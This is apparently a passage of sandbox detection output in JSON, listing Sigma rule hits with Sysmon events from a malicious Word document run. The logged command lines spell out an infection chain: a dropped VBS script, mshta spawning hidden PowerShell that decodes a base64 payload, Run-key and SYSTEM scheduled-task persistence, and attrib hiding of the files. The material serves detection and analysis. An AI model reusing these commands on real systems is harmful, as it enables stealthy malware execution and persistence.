                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "27b72c2678411f21ba21bd10b44b7e9c45594d5a5f61f14223b81a8906675039",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "New RUN Key Pointing to Suspicious Folder",
                                                                       "rule_description":  "Detects suspicious new RUN key element pointing to an executable in a suspicious folder",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=5600; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; UtcTime=1689099483; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=5600; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; UtcTime=1689099483; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; RuleName=T1060,RunKey; TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=4236; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-9CE6-64AD-4906-000000004400}; UtcTime=1689099546; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{RuleName=T1060,RunKey; EventType=SetValue; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; EventID=13; TargetObject=HKU\\S-1-5-21-4005801669-2598574594-602355426-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2d15bc5d08223728e30ed4330ad99024b1467ac8ddb073e7ed368b0468898e80",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Legitimate Application Dropped Script",
                                                                       "rule_description":  "Detects programs on a Windows system that should not write scripts to disk",
                                                                       "rule_author":  "frack113, Florian Roth",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=4532; TargetFilename=C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; ProcessGuid={C784477D-9CBE-64AD-3A06-000000004400}; CreationUtcTime=1689099460; UtcTime=1689099460; RuleName=-; Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "31e1f4457871d51593456a4331811513af82fe4e36d2b26a582dd6baa180a91d",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Mshta.EXE Execution Patterns",
                                                                       "rule_description":  "Detects suspicious mshta process execution patterns",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CC5-64AD-3D06-000000004400}; ProcessId=6624; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CC5-64AD-3C06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=972; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-5D99-030000000000; LogonId=235869; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; UtcTime=1689099461; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CE6-64AD-4806-000000004400}; ProcessId=6068; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CE5-64AD-4706-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=1452; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\wscript.exe\" C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; UtcTime=1689099494; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CEE-64AD-4C06-000000004400}; ProcessId=3372; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CED-64AD-4B06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=2324; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\wscript.exe\" C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; UtcTime=1689099502; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CF6-64AD-5006-000000004400}; ProcessId=3632; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CF5-64AD-4F06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=6472; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\wscript.exe\" C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; UtcTime=1689099510; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; ParentImage=C:\\Windows\\SysWOW64\\wscript.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\mshta.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "5c100e376f43b26c0279b6ecab437d35499a64f73cd9c1b180f62e840eebd2a6",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Created Files by Office Applications",
                                                                       "rule_description":  "This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice.",
                                                                       "rule_author":  "Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=4532; TargetFilename=C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; ProcessGuid={C784477D-9CBE-64AD-3A06-000000004400}; CreationUtcTime=1689099460; UtcTime=1689099460; RuleName=-; Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "5c100e376f43b26c0279b6ecab437d35499a64f73cd9c1b180f62e840eebd2a6",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "File With Uncommon Extension Created By An Office Application",
                                                                       "rule_description":  "Detects the creation of files with an executable or script extension by an Office application.",
                                                                       "rule_author":  "Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Image=C:\\Program Files (x86)\\Microsoft Office\\Office16\\WINWORD.EXE; EventID=11; TargetFilename=C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "6a6edfdea6536f74ea66bf73682ed52f4b86435793ed76ff38e3ab0523f029f5",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Microsoft Office Child Process",
                                                                       "rule_description":  "Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft \\xae Windows Script Host; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=wscript.exe; Hashes=MD5=FF00E0480075B095948000BDC66E81F0,SHA256=8C767077BB410F95B1DB237B31F4F6E1512C78C1F0120DE3F215B501F6D1C7EA,IMPHASH=3602F3C025378F418F804C5D183603FE; Description=Microsoft \\xae Windows Based Script Host; EventID=1; ParentCommandLine=\"C:\\Program Files (x86)\\Microsoft Office\\Office16\\WINWORD.EXE\" \"C:\\Users\\Bruno\\Desktop\\document.doc\" /q; CommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; FileVersion=5.812.10240.16384; ParentImage=C:\\Program Files (x86)\\Microsoft Office\\Office16\\WINWORD.EXE; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\wscript.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "7a63d1c1bf6ebb277b02d4893066d3732e3d7df562cfdbfee275bbc5c4de0951",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "MSHTA Suspicious Execution 01",
                                                                       "rule_description":  "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism",
                                                                       "rule_author":  "Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Internet Explorer; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; ParentImage=C:\\Windows\\SysWOW64\\wscript.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\mshta.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "80bbf1ed6106205ab2926430c9634286f976b2fee4357dbacddec45b979a4422",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Windows Shell/Scripting Processes Spawning Suspicious Programs",
                                                                       "rule_description":  "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Tim Shelton",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; ParentImage=C:\\Windows\\SysWOW64\\wscript.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\mshta.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=schtasks.exe; Hashes=MD5=478BEAEC1C3A9417272BC8964ADD1CEE,SHA256=9A121ACF7686D2883E524332111D5E4BCC0C1A8E81136486FBA4CA65CA614407,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05; Description=Task Scheduler Configuration Tool; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\schtasks.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "a4d012f0f7c21ebed94f8e82f4910702fcbcd9d21bf70e4b1b039f48970d1bbc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Parent Process",
                                                                       "rule_description":  "Detects a suspicious or uncommon parent processes of PowerShell",
                                                                       "rule_author":  "Teymur Kheirkhabarov, Harish Segar",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\mshta.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "a9278f03bce6b217a82c054a78cc6ea5acfebb4b16cd25b7d6cd842bb1dcfd8f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Schtasks Creation Or Modification With SYSTEM Privileges",
                                                                       "rule_description":  "Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CDB-64AD-4206-000000004400}; ProcessId=6452; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5600; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; EventID=1; LogonGuid=C784477D-CFAC-648A-5D99-030000000000; LogonId=235869; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099483; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9D1A-64AD-5806-000000004400}; ProcessId=5484; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CE6-64AD-4906-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4236; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099546; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=478BEAEC1C3A9417272BC8964ADD1CEE,SHA256=9A121ACF7686D2883E524332111D5E4BCC0C1A8E81136486FBA4CA65CA614407,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=schtasks.exe; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\schtasks.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "afdcecbde34527044e8c4c24e502ed3dfae6daa2d07665ad18226afff77ed6fe",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Set Suspicious Files as System Files Using Attrib.EXE",
                                                                       "rule_description":  "Detects the usage of attrib with the \"+s\" option to set scripts or executables located in suspicious locations as system files to hide them from users and make them unable to be deleted with simple rights. The rule limits the search to specific extensions and directories to avoid FPs\n",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CDA-64AD-4006-000000004400}; ProcessId=264; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=FDC601145CD289C6FBC96D3F805F3CD7,SHA256=FF8600A444A3F086F17A24293E0172E6033D62C3766D4497997B882D663F8221,IMPHASH=2CB38FE7D8F223D9DA50B7CBA9B95A6D; OriginalFileName=ATTRIB.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5600; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\attrib.exe\" +s +h C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; EventID=1; LogonGuid=C784477D-CFAC-648A-5D99-030000000000; LogonId=235869; Image=C:\\Windows\\System32\\attrib.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099482; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CDA-64AD-4106-000000004400}; ProcessId=6336; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=FDC601145CD289C6FBC96D3F805F3CD7,SHA256=FF8600A444A3F086F17A24293E0172E6033D62C3766D4497997B882D663F8221,IMPHASH=2CB38FE7D8F223D9DA50B7CBA9B95A6D; OriginalFileName=ATTRIB.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5600; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\attrib.exe\" +s +h C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini; EventID=1; LogonGuid=C784477D-CFAC-648A-5D99-030000000000; LogonId=235869; Image=C:\\Windows\\System32\\attrib.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099482; RuleName=-}"
                                                                                             },
                                                                                             {
